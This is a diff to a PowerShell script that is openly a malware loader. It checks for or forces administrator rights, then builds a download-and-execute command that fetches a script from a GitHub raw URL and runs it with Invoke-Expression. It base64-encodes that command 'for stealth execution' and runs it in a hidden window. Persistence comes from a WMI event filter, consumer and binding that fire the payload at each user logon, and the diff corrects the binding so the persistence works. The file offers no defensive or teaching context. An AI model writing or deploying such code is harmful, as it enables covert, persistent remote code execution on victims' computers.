@@ -1,15 +1,33 @@
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Error "NOT RUNNING AS ADMIN"
+    pause
+    exit
+}
+# Auto-elevate if not running as admin
+If (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
+    [Security.Principal.WindowsBuiltInRole] "Administrator"))
+{
+    Start-Process powershell -Verb runAs -ArgumentList ("-ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Definition + "`"")
+    exit
+}
+
+# Payload URL (make sure this is accessible and correct)
 $payloadUrl = "https://raw.githubusercontent.com/Blue15195/111/refs/heads/main/2"
 
+# Construct inline payload to download and execute the remote script
 $payload = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; " + `
            "$down = New-Object System.Net.WebClient; " + `
            "$script = $down.DownloadString('$payloadUrl'); " + `
            "Invoke-Expression $script;"
 
+# Encode it in base64 for stealth execution
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
 $encodedPayload = [Convert]::ToBase64String($bytes)
 
 $finalCommand = "powershell.exe -NoP -NonI -W Hidden -EncodedCommand $encodedPayload"
 
+# WMI Event Filter (triggers on user login)
 $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ 
     Name = 'WMI_LogonTrigger'
     EventNamespace = 'root\cimv2'
@@ -17,12 +35,14 @@ $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arg
     Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.UserName != NULL"
 }
 
+# CommandLine Consumer that runs the payload
 $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ 
     Name = 'WMI_MemoryLoader'
     CommandLineTemplate = $finalCommand
 }
 
+# Bind the Filter and Consumer together (persistence trigger)
 Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ 
-    Filter = $filter
-    Consumer = $consumer
+    Filter = $filter.__PATH
+    Consumer = $consumer.__PATH
 }
